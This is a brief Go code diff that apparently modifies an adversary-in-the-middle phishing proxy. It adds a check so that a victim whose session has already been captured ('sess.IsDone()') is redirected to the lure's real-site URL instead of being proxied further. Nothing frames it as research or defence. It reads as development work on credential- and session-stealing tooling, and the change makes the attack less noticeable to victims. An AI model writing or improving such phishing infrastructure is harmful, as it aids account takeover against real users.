@@ -32,6 +32,13 @@ func (h *SessionGate) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 		if sess, err := h.Sessions.Get(cookie.Value); err == nil {
 			ctx.Session = sess
 			ctx.IsNewSession = false
+
+			// Session already complete — redirect to the real site immediately
+			// instead of proxying further requests.
+			if sess.IsDone() && ctx.Lure != nil && ctx.Lure.RedirectURL != "" {
+				http.Redirect(ctx.ResponseWriter, req, ctx.Lure.RedirectURL, http.StatusFound)
+				return proxy.ErrShortCircuit
+			}
 			return nil
 		}
 	}
